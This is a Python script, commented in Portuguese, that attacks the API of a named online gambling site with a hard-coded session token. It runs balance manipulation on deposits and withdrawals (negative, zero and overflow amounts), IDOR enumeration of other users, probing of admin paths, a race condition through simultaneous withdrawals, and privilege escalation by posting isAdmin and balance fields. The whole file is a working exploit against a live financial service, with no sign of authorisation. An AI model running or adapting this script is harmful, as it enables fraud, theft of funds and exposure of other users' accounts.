"""
Testa o token obtido em todos os endpoints críticos:
- Info do usuário
- Saldo
- Depósito com valores manipulados
- Saque com valores manipulados
- IDOR (acessar outros usuários)
- Painel admin
- Race condition
"""
import urllib.request, ssl, json, uuid, threading, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE  = "https://m.amizade777.com"
TOKEN = "137027:1780606100:3001:b3e5ba9da2033d21352bdc872384d052"
PKG   = "com.slots.big"
DID   = str(uuid.uuid4()).replace("-","")[:32]

def post(path, data=None):
    body = json.dumps(data or {}).encode()
    h = {
        "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Content-Type": "application/json",
        "Accept":       "application/json, */*",
        "token":        TOKEN,
        "Origin":       BASE,
        "Referer":      BASE + "/",
    }
    try:
        r = urllib.request.Request(BASE + path, data=body, headers=h, method="POST")
        with urllib.request.urlopen(r, timeout=12, context=ctx) as resp:
            return resp.status, json.loads(resp.read(8192).decode("utf-8","ignore"))
    except urllib.error.HTTPError as e:
        try:    return e.code, json.loads(e.read(4096).decode("utf-8","ignore"))
        except: return e.code, {}
    except Exception as ex:
        return 0, {"err": str(ex)}

def get(path):
    h = {
        "User-Agent": "Mozilla/5.0",
        "Accept":     "application/json, */*",
        "token":      TOKEN,
        "Origin":     BASE,
        "Referer":    BASE + "/",
    }
    try:
        r = urllib.request.Request(BASE + path, headers=h)
        with urllib.request.urlopen(r, timeout=12, context=ctx) as resp:
            return resp.status, json.loads(resp.read(8192).decode("utf-8","ignore"))
    except urllib.error.HTTPError as e:
        try:    return e.code, json.loads(e.read(4096).decode("utf-8","ignore"))
        except: return e.code, {}
    except Exception as ex:
        return 0, {"err": str(ex)}

def show(label, st, body):
    code = body.get("code","?")
    msg  = body.get("msg","")
    data = body.get("data","")
    flag = " *** ACESSO OK ***" if code == 200 else ""
    print(f"  {label}")
    print(f"    HTTP={st} code={code} msg={msg!r}{flag}")
    if code == 200 and data:
        print(f"    DATA: {json.dumps(data, ensure_ascii=False)[:300]}")

# ═══════════════════════════════════════════════════════════
print("\n" + "="*60)
print("1. VALIDAR TOKEN — INFO DO USUÁRIO")
print("="*60)

# Tentativas de obter informações do usuário
for path in [
    "/prod-api/player/info",
    "/prod-api/player/profile",
    "/japi/user/balance/querySimpleBalance",
    "/prod-api/vip/info",
    "/prod-api/user/info",
    "/prod-api/member/info",
]:
    time.sleep(0.5)
    st, body = get(path)
    show(path, st, body)

# ═══════════════════════════════════════════════════════════
print("\n" + "="*60)
print("2. SALDO E CARTEIRA")
print("="*60)

for path in [
    "/prod-api/payment/balance-less",
    "/prod-api/pay-service/withdraw-limit",
    "/prod-api/pay-service/recharge-list",
    "/prod-api/finance/recharge/list",
    "/prod-api/finance/withdraw/list",
    "/japi/user/balance/querySimpleBalance",
]:
    time.sleep(0.5)
    st, body = get(path)
    show(path, st, body)

# ═══════════════════════════════════════════════════════════
print("\n" + "="*60)
print("3. MANIPULAÇÃO DE DEPÓSITO — VALORES MALICIOSOS")
print("="*60)

deposit_payloads = [
    {"amount": -100,              "label": "Negativo -100"},
    {"amount": -1,                "label": "Negativo -1"},
    {"amount": 0,                 "label": "Zero"},
    {"amount": 0.000000001,       "label": "Fracionário extremo"},
    {"amount": 9007199254740991,  "label": "MAX_SAFE_INTEGER"},
    {"amount": "10",              "label": "String '10'"},
    {"amount": "abc",             "label": "String inválida"},
    {"money":  -100,              "label": "Campo 'money' negativo"},
    {"recharge_amount": -100,     "label": "recharge_amount negativo"},
]

deposit_paths = [
    "/prod-api/pay-service/recharge",
    "/prod-api/finance/recharge",
    "/prod-api/recharge",
    "/prod-api/deposit",
    "/prod-api/order/recharge",
    "/prod-api/payment/recharge",
]

for path in deposit_paths:
    time.sleep(0.5)
    for pl in deposit_payloads:
        label = pl.pop("label")
        payload = dict(pl, appPackageName=PKG, deviceId=DID)
        st, body = post(path, payload)
        code = body.get("code","?")
        msg  = body.get("msg","")
        if st not in (0, 404, 405):
            flag = " *** ACEITO! ***" if code == 200 else ""
            print(f"  {path} [{label}] -> HTTP={st} code={code} msg={msg!r}{flag}")
            if code == 200:
                print(f"  DATA: {json.dumps(body.get('data',{}), ensure_ascii=False)[:300]}")
        pl["label"] = label  # restaurar

# ═══════════════════════════════════════════════════════════
print("\n" + "="*60)
print("4. MANIPULAÇÃO DE SAQUE — VALORES MALICIOSOS")
print("="*60)

withdraw_payloads = [
    {"amount": -100,              "label": "Negativo -100 (credita?)"},
    {"amount": -1,                "label": "Negativo -1"},
    {"amount": 0,                 "label": "Zero"},
    {"amount": 0.000000001,       "label": "Fracionário extremo"},
    {"amount": 9007199254740991,  "label": "MAX_SAFE_INTEGER"},
    {"amount": 1,                 "label": "Normal 1"},
    {"withdraw_amount": -100,     "label": "withdraw_amount negativo"},
]

withdraw_paths = [
    "/prod-api/payment/balance-less",
    "/prod-api/pay-service/withdraw",
    "/prod-api/finance/withdraw",
    "/prod-api/withdraw",
    "/prod-api/order/withdraw",
]

for path in withdraw_paths:
    time.sleep(0.5)
    for pl in withdraw_payloads:
        label = pl.pop("label")
        payload = dict(pl, appPackageName=PKG, deviceId=DID)
        st, body = post(path, payload)
        code = body.get("code","?")
        msg  = body.get("msg","")
        if st not in (0, 404, 405):
            flag = " *** ACEITO! ***" if code == 200 else ""
            print(f"  {path} [{label}] -> HTTP={st} code={code} msg={msg!r}{flag}")
            if code == 200:
                print(f"  DATA: {json.dumps(body.get('data',{}), ensure_ascii=False)[:300]}")
        pl["label"] = label

# ═══════════════════════════════════════════════════════════
print("\n" + "="*60)
print("5. IDOR — ACESSAR OUTROS USUÁRIOS")
print("="*60)
# O token tem user_id = 137059 (extraído do token)
# Tentar acessar user_id 1, 2, 3, 137058, 137060 etc.

# Extrair user_id do token
token_parts = TOKEN.split(":")
my_uid = int(token_parts[0]) if token_parts[0].isdigit() else None
print(f"  Meu user_id (do token): {my_uid}")

uids_alvo = [1, 2, 3, 10, 100, 1000]
if my_uid:
    uids_alvo += [my_uid - 1, my_uid + 1, my_uid - 10, my_uid + 10]
uids_alvo += [0, -1, 99999, 137060, 137058, 137001]

idor_paths = [
    "/prod-api/player/{}",
    "/prod-api/player/info/{}",
    "/prod-api/user/{}",
    "/prod-api/member/{}",
    "/japi/user/player/{}",
]

for uid in sorted(set(uids_alvo)):
    for tmpl in idor_paths:
        time.sleep(0.3)
        path = tmpl.format(uid)
        st, body = get(path)
        code = body.get("code","?")
        if code == 200:
            print(f"  *** IDOR [{st}] {path}")
            print(f"      DATA: {json.dumps(body.get('data',{}), ensure_ascii=False)[:300]}")
        elif st not in (0, 404, 405, 403) and code not in ("?",):
            print(f"  [{st}] {path} -> code={code} msg={body.get('msg','')!r}")

# ═══════════════════════════════════════════════════════════
print("\n" + "="*60)
print("6. PAINEL ADMIN — TENTAR ACESSO COM TOKEN DE USUÁRIO NORMAL")
print("="*60)

admin_paths = [
    "/prod-api/admin/user/list",
    "/prod-api/admin/player/list",
    "/prod-api/admin/finance/list",
    "/prod-api/admin/recharge/list",
    "/prod-api/admin/withdraw/list",
    "/prod-api/admin/system/config",
    "/prod-api/admin/config",
    "/prod-api/admin/dashboard",
    "/prod-api/superadmin",
    "/prod-api/manage/user",
    "/japi/admin",
    "/japi/admin/user/list",
    "/japi/manage",
    "/japi/manage/finance",
]

for path in admin_paths:
    time.sleep(0.4)
    st, body = get(path)
    code = body.get("code","?")
    msg  = body.get("msg","")
    if st not in (0, 404, 405, 403) or code == 200:
        flag = " *** ADMIN ACESSÍVEL! ***" if code == 200 else ""
        print(f"  [GET {st}] {path} -> code={code} msg={msg!r}{flag}")
        if code == 200:
            print(f"  DATA: {json.dumps(body.get('data',{}), ensure_ascii=False)[:400]}")

# ═══════════════════════════════════════════════════════════
print("\n" + "="*60)
print("7. RACE CONDITION — 3 SAQUES SIMULTÂNEOS")
print("="*60)

resultados_race = []
lock = threading.Lock()

def saque_simultaneo(n):
    payload = {"amount": 1, "appPackageName": PKG, "deviceId": DID}
    body = json.dumps(payload).encode()
    h = {
        "User-Agent":   "Mozilla/5.0",
        "Content-Type": "application/json",
        "token":        TOKEN,
    }
    try:
        r = urllib.request.Request(BASE + "/prod-api/payment/balance-less",
                                   data=body, headers=h, method="POST")
        with urllib.request.urlopen(r, timeout=12, context=ctx) as resp:
            result = (resp.status, json.loads(resp.read(4096).decode("utf-8","ignore")))
    except urllib.error.HTTPError as e:
        try:    result = (e.code, json.loads(e.read(2048).decode("utf-8","ignore")))
        except: result = (e.code, {})
    except Exception as ex:
        result = (0, {"err": str(ex)})
    with lock:
        resultados_race.append((n, result[0], result[1]))

# Disparar 3 threads simultaneamente
threads = [threading.Thread(target=saque_simultaneo, args=(i,)) for i in range(3)]
for t in threads: t.start()
for t in threads: t.join(timeout=15)

sucesso = sum(1 for _, st, b in resultados_race if b.get("code") == 200)
print(f"  {len(resultados_race)} respostas recebidas  |  {sucesso} com code=200")
for n, st, body in resultados_race:
    code = body.get("code","?")
    msg  = body.get("msg","")
    print(f"  Thread {n}: HTTP={st} code={code} msg={msg!r}")
    if code == 200:
        print(f"  DATA: {json.dumps(body.get('data',{}), ensure_ascii=False)[:200]}")

if sucesso >= 2:
    print("  *** RACE CONDITION CONFIRMADA — múltiplos saques aceitos! ***")

# ═══════════════════════════════════════════════════════════
print("\n" + "="*60)
print("8. PRIVILEGE ESCALATION — ALTERAR PRÓPRIO NÍVEL/SALDO")
print("="*60)

escalation_payloads = [
    ("/prod-api/player/update", {"balance": 99999, "vipLevel": 99, "isAdmin": True}),
    ("/prod-api/player/update", {"role": "admin", "level": 99}),
    ("/prod-api/user/update",   {"balance": 99999, "isAdmin": 1}),
    ("/prod-api/member/update", {"balance": 99999, "admin": True}),
    ("/prod-api/player/update", {"user_id": 1, "balance": 99999}),  # trocar user_id = IDOR write
]

for path, payload in escalation_payloads:
    time.sleep(0.5)
    st, body = post(path, payload)
    code = body.get("code","?")
    msg  = body.get("msg","")
    if st not in (0, 404, 405):
        flag = " *** ACEITO! ***" if code == 200 else ""
        print(f"  [POST {st}] {path} payload={list(payload.keys())} -> code={code} msg={msg!r}{flag}")
        if code == 200:
            print(f"  DATA: {json.dumps(body.get('data',{}), ensure_ascii=False)[:300]}")

print("\n\nConcluído.")
